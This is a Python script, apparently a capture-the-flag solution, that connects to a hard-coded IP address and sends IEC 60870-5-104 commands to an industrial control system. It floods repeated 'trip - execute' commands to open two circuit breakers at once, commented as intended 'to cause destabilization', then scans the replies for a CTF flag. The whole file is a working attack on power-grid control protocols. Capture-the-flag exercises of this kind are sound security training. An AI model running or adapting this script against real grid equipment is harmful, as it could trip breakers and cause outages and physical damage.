#!/usr/bin/env python3
import socket
import time

HOST = '169.58.126.107'
PORT = 6004

def main():
    s = socket.socket()
    s.settimeout(400)
    try:
        s.connect((HOST, PORT))
        s.send(bytes([0x68, 0x04, 0x07, 0x00, 0x00, 0x00]))
        time.sleep(2)
        r = s.recv(1024)
        print(r.hex() if r else 'none')
        ca = bytes([0x01, 0x00])
        tx = [0]; rx = [0]
        def send_i(asdu):
            apci = bytes([0x68, len(asdu)+4, tx[0]&0xFF,(tx[0]>>8)&0xFF, rx[0]&0xFF,(rx[0]>>8)&0xFF])
            tx[0] += 2; rx[0] += 2
            s.send(apci+asdu)
        # Open both breakers at the same time to cause destabilization
        for _ in range(10):
            for ioa_num in [1, 2]:
                ioa = bytes([ioa_num&0xFF,(ioa_num>>8)&0xFF,(ioa_num>>16)&0xFF])
                # Trip command - execute
                asdu = bytes([45, 0x01, 0x06, 0x00]) + ca + ioa + bytes([0x81])
                send_i(asdu)
            time.sleep(0.01)
        print('flooded')
        start = time.time()
        while time.time() - start < 300:
            try:
                s.settimeout(60)
                r = s.recv(65535)
                if not r: 
                    print('closed')
                    break
                print('===', len(r), r.hex())
                if b'CTF{' in r:
                    print(r)
                    # extract
                    idx = r.find(b'CTF{')
                    if idx >= 0:
                        end = r.find(b'}', idx)
                        if end >= 0:
                            print('FLAG:', r[idx:end+1])
                    break
            except socket.timeout:
                try: s.send(bytes([0x68,0x04,0x43,0x00,0x00,0x00]))
                except: break
                continue
            except Exception as e:
                print(e); break
    finally:
        try: s.close()
        except: pass

if __name__ == '__main__':
    main()
